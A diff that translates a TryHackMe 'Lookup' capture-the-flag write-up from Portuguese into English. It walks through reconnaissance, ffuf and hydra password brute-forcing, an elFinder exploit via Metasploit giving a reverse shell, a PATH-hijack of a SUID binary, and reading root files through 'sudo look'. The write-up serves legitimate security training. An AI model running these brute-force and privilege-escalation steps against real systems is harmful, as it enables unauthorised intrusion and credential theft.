@@ -1,32 +1,24 @@
-> [!WARNING]
-> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).
-
 # [Lookup](https://tryhackme.com/room/lookup)
 
 <a href="https://tryhackme.com/room/lookup"><figure><img src="./assets/logo.png" width="175" title="tryhackme.com - © TryHackMe"></figure></a>
 
 > Test your enumeration skills on this boot-to-root machine.
 
-Capture The Flag original disponível em [((host))](https://tryhackme.com/room/lookup), feito por ((author)).
+Original Capture The Flag available on [Try Hack Me](https://tryhackme.com/room/lookup), made by [tryhackme](https://tryhackme.com/p/tryhackme) and [josemlwdf](https://tryhackme.com/p/josemlwdf).
 
-Dificuldade: `Fácil`
+Dificulty: `Easy`
 
-Resolvido em: `2026/05/10`
+Solved in: `2026/05/10`
 
-# Conteúdos
+# Table of Contents
 
-- [Lookup](#lookup)
-- [Conteúdos](#conteúdos)
-- [Writeup](#writeup)
-   * [Reconhecimento](#reconhecimento)
-   * [Exploração](#exploração)
-   * [Escalação de Privilégios](#escalação-de-privilégios)
+...
 
 # Writeup
 
 ## Reconhecimento
 
-Seguindo os padrões de reconhecimento, primeiro chequei se o IP disponibilizado realmente estava funcionando:
+Following the usual steps, I checked if the provided ip was working:
 
 ```bash
 $ ping -c 3 <MACHINE_IP>
@@ -40,7 +32,7 @@ PING <MACHINE_IP> (<MACHINE_IP>) 56(84) bytes of data.
 rtt min/avg/max/mdev = 139.688/140.034/140.636/0.426 ms
 ```
 
-E enfim realizei um `nmap`[^nmap] para encontrar as portas disponíveis.
+And thus did a `nmap`[^nmap] to see the available ports:
 
 ```bash
 $ nmap -T4 <MACHINE_IP>
@@ -55,22 +47,22 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 2.33 seconds
 ```
 
-Tenho um `ssh:22` e `http:80`. Bem, checando o website...
+I got a `ssh:22` and `http:80`. Well, checking the website...
 
 <figure><img src="./assets/lookup0.png" title="DNS fail"></figure>
 
-Por algum motivo o browser alterou o link para `lookup.thm`, mas tal não está no DNS. Então tive de adicionar `lookup.thm` no DNS local `/etc/hosts`:
+For some reason the webbrowser changed the IP to `lookup.thm`, but that's not in the DNS. So was `lookup.thm` added to the local DNS `/etc/hosts`:
 
 ```
 /etc/hosts
 <MACHINE_IP>   lookup.thm
 ```
 
-E deu tudo certo.
+And everything was once more right.
 
 <figure><img src="./assets/lookup1.png" title="Landing page"></figure>
 
-Revelando uma página de login. A qual eu não tenho credenciais. Nem tenho para o `ssh`! Então decidi procurar mais fundo `gobuster`[^gobuster]:
+It's a login page, to which I have no credentials. Nor for the `ssh` for that matter! So I decided to go further with `gobuster`[^gobuster]:
 
 ```bash
 $ gobuster dir -u http://lookup.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
@@ -93,15 +85,15 @@ Starting gobuster in directory enumeration mode
 /login.php            (Status: 200) [Size: 1]
 ```
 
-E nenhum desses links são úteis. `/index.php` é a página inicial, e `/login.php` a página redirecionada após o login. Tentei buscar por exploits em Apache 2.4.41 (informação revelada com um `nmap` profundo) mas nenhum era aplicável. Então decidi tentar um ataque de força bruta...
+But none of those links are really useful. `/index.php` is the landing page, and `/login.php` the redirect after the login. I tried searching for exploits in Apache 2.4.41 (information gotten through a more thorough `nmap`) but none were really aplicable. I decided to do a brute force, then...
 
-Usando `ffuf`[^ffuf], uma [wordlist de usernames](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames-dup.txt), e a senha `password`, tentei, com poucas esperanças, ver se o desenvolvedor sem querer permitiu que o sistema fosse vulnerável.
+Using `ffuf`[^ffuf], a [username wordlist](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames-dup.txt), and a bogus password `password`, I tried, with little hope, to see if the developer had left the system vulnerable.
 
 ```bash
 $ ffuf -w xato-net-10-million-usernames-dup.txt -X POST -u http://lookup.thm/login.php -d "username=FUZZ&password=password" -H "Content-Type: application/x-www-form-urlencoded"
 ```
 
-Deixei rodar por um tempo, e parece que a resposta padrão tinha tamanho `74`, então filtrei com `-fs 74` e rodei o comando novamente:
+So it ran for a while, and it seems the default size was `74`. So, I filtered it out with `-fs 74` and reran the command:
 
 ```bash
 $ ffuf -w xato-net-10-million-usernames-dup.txt -X POST -u http://lookup.thm/login.php -d "username=FUZZ&password=password" -H "Content-Type: application/x-www-form-urlencoded" -fs 74
@@ -133,32 +125,32 @@ jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 14
 admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 2853ms]
 ```
 
-Dois usuários tiveram respostas diferentes! `admin` e `jose`. Seguindo, então, decidi aplicar o mesmo processo de força-bruta, apenas agora na senha usando o usuário `admin`. A lista de senhas é rockyou[^rockyou]
+Two users! `admin` and `jose`. Following suit, then, I tried applying the same brute-force method, though now using `admin` as username and rockyou[^rockyou] as the password wordlist.
 
 ```bash
 $ ffuf -w /usr/share/wordlists/rockyou.txt -X POST -u http://lookup.thm/login.php -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"
 ```
 
-Desta vez, o tamanho padrão era `62`, então após filtrá-lo com `-fs 62` obtive:
+This time the default size was `62`, so after filtering it out with `-fs 62`:
 
 ```bash
 $ ffuf -w /usr/share/wordlists/rockyou.txt -X POST -u http://lookup.thm/login.php -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 62 -s
 <A_PASS>
 ```
 
-Ótimo, uma senha! Agora, com o usuário `admin` e senha `<A_PASS>`...
+A password! Now, with `admin` and `<A_PASS>`...
 
 <figure><img src="./assets/lookup2.png" title="Login fail"></figure>
 
-Estranho. A combinação não foi aceita. Eu sei que não tem motivo lógico, mas tentei essa mesma senha com o usuário `jose`.
+Weird. The combination was invalid. I know it is crazy to do so, but I then tried the exact same password with the user `jose`.
 
-## Exploração
+## Exploration
 
-O login funcionou, mas tive de adicionar o subdomínio `files.lookup.thm` em `/etc/hosts`. De qualquer forma, o acesso levou-me a uma página de arquivos. 
+The login worked, but I had to add the subdomain `files.lookup.thm` to the local DNS too. Either way, the access brought me to a file browser.
 
 <figure><img src="./assets/lookup3.png" title="Login success"></figure>
 
-Todos os arquivos eram palavras aleatórias, sem contexto, exceto dois.
+All files had random words, without much context, except two of them.
 
 ```
 thislogin.txt
@@ -170,7 +162,9 @@ credentials.txt
 think : nopassword
 ```
 
-Eu tentei usar as credenciais disponíveis em `credentials.txt` para fazer o login no `ssh`, mas não eram válidas. Eu até compilei todas as palavras disponíveis aqui para um arquivo só, mas antes de atacar na força-bruta, decidi procurar por exploits.
+I tried logging in on `ssh` with the `credentials.txt` info, but it wasn't valid. I even compiled all random words into one file and bruteforced it both as user and password, but even then.
+
+Thus I looked into exploits.
 
 ```bash
 $ searchsploit elfinder
@@ -185,9 +179,9 @@ elFinder Web file manager Version - 2.1.53 Remote Command Execution  | php/webap
 Shellcodes: No Results
 ```
 
-Já que a versão do elfinder era `2.1.47`, batendo exatamente com o exploit `PHP Connector` (`46481`), decidi tentar usá-lo. Já que também estava disponível no `metasploit`[^ms], configurei por lá. As únicas configurações relevantes eram `rhosts` para o IP da máquina e `lhost` para o IP do meu computador.
+Since the `elfinder` version was `2.1.47`, matching exactly with the `PHP Connector` exploit (`46481`), I decided to use it. It was available in `metasploit`,[^ms] so I configured it there. The only real settings was `rhosts` for the machine IP and `lhost` for my own IP.
 
-Após realizar o exploit, fui agraciado com um reverse shell[^rv], e logo busquei por arquivos que poderiam ser úteis. Encontrei um arquivo SQL...
+After the exploit, I was then given a reverse shell[^rv] and soon searched for useful files. There was a SQL...
 
 ```bash
 meterpreter > pwd
@@ -198,11 +192,11 @@ meterpreter > download MySQLStorage.sql
 [*] Completed  : MySQLStorage.sql -> /home/kali/MySQLStorage.sql
 ```
 
-Mas não havia nenhuma informação nele. Eu tentei escalar para um terminal próprio fazendo upload de um revshell diretamente na pasta do `elfinder`, mas o sistema deleta arquivos `.php` antes mesmo de executá-los.
+But no info inside it. I tried escalating to another terminal but `elfinder` literally deletes `.php` files before executing them.
 
-Daí eu segui para a ideia de fazer a força bruta no `ssh` usando os usuários `admin`, `jose` e `think`, e a lista de palavras do servidor, mas nenhuma funcionou. Em seguida, derrubei meu terminal do `metasploit` e tentei executar `sudo -l`. Pediu senha. 
+So I followed on and tried `sudo -l`. It asked for a password.
 
-Como a última esperança, procurei por arquivos com permissão SUID do root. Dentre eles, um comando misterioso se destacou:
+As a last hope, I searched for files with SUID root permission. Within those, I mystical command appeared:
 
 ```bash
 $ find / -perm -4000 2>/dev/null; echo "finished"
@@ -217,7 +211,7 @@ $ find / -perm -4000 2>/dev/null; echo "finished"
 ...
 ```
 
-O `/usr/sbin/pwm` não é um comando normal. Executando ele...
+`/usr/sbin/pwm` isn't an usual command. Executing it...
 
 ```bash
 $ pwm
@@ -226,7 +220,7 @@ $ pwm
 [-] File /home/www-data/.passwords not found
 ```
 
-Ele roda outro comando, `id`. Existe uma chance não nula que o comando é executado com caminho relativo, permitindo PATH hijacking. Já fui ao trabalho. 
+It runs another command, `id`. There is a non-zero chance the command is executed relatively, which allows for PATH hijacking. Got to work.
 
 ```bash
 $ cd /tmp
@@ -241,14 +235,14 @@ $ which id
 /tmp/id
 ```
 
-Infelizmente apenas carregar um terminal como root não funcionou. Então segui com a próxima ideia.
+Sadly trying to simply execute a root terminal wasn't enough. So I tried the second idea.
 
 ```bash
 $ /usr/bin/id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-O comando `id` retorna os valores relacionados com o usuário, então só preciso disfarçar minha sessão como root. Tentando tal:
+The command `id` returns values related to the user, so I just need to change them to root, no? Trying so:
 
 ```bash
 $ echo "#!/bin/bash\necho \"uid=0(root)  gid=0(root) groups=0(root)\"" > id
@@ -259,7 +253,7 @@ $ pwm
 [-] File /home/root/.passwords not found
 ```
 
-Novamente não funcionou, desta vez apenzas porque o script também busca por um arquivo `/home/user/.passwords`. Rapidamente, ainda dentro desse escopo, é fácil de verificar quem tem essa pasta:
+Once more it didn't work, but this time because the script also looks for the file `/home/user/.passwords`. Well, time to look around the user homes and see who's got that.
 
 ```bash
 $ ls -la /home/think
@@ -278,9 +272,9 @@ lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
 -rw-r----- 1 root  think   33 Jul 30  2023 user.txt
 ```
 
-Por sinal, esse `user.txt` é a flag de usuário, mas não tenho acesso suficiente ainda para lê-la.
+> By the way, that `user.txt` is the user flag, but currently I don't have the proper privileges to read it.
 
-Enfim, rodar `pwm` leva a um grupo grande de senhas:
+Now, running `pwm` leads to a password list:
 
 ```bash
 $ echo "#!/bin/bash\necho \"uid=1000(think) gid=1000(think) groups=1000(think)\"" > id
@@ -294,7 +288,7 @@ jose.9298
 jose.2856171
 ```
 
-Todas são do formato `jose` seguido de alguma combinação aleatória de números, caracteres especiais, palavras... Agora, com um grupo próprio de senhas, pude tentar realizar um ataque de força-bruta no `ssh` com `hydra`[^hydra] e esse grupo de senhas:
+All in the format `jose` followed by a random combination of numbers, special characters, other words... Now, with a proper password list, I returned to `ssh` and `hydra`[^hydra] to make a brute force attack:
 
 ```bash
 $ hydra -l think -P ~/Desktop/josewl.txt ssh://lookup.thm
@@ -309,16 +303,16 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-10 23:07:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-10 23:07:45
 ```
 
-Obtendo acesso como o usuário `think` usando a senha `<T_PASS>`.
+Getting it right with the user `think` and the password `<T_PASS>`.
 
 ```bash
 think@<MACHINE_IP>:~$ whoami
 think
 ```
 
-## Escalação de Privilégios
+## Privileges escalation
 
-Daqui o processo é simples. Primeiro, com esse novo privilégio, eu adiquiri a flag de usuário:
+From here it is simple. First, get the user flag:
 
 ```bash
 think@<MACHINE_IP>:~$ pwd
@@ -327,7 +321,7 @@ think@<MACHINE_IP>:~$ cat user.txt
 <FLAG_USER>
 ```
 
-E segui com o uso de `sudo -l` para verificar possibilidades de escalação para root.
+Then follow `sudo -l` to see what could I do to become root.
 
 ```bash
 think@<MACHINE_IP>:~$ sudo -l
@@ -340,14 +334,14 @@ User think may run the following commands on <MACHINE_IP>:
     (ALL) /usr/bin/look
 ```
 
-Nem precisarei. Nesse caso, com `usr/bin/look` eu tenho leitura a todo arquivo do sistema, então posso fazer o seguinte:
+Oh. I don't need to. I can just read every file in the system with `/usr/bin/look`. Taking a shot in the dark:
 
 ```bash
 think@<MACHINE_IP>:~$ sudo look "" /root/root.txt
 <FLAG_ROOT>
 ```
 
-E obter a flag de root sem escalar os privilégios.
+I got the root flag without escalating privileges.
 
 [^nmap]: https://github.com/nmap/nmap
 [^gobuster]: https://github.com/OJ/gobuster
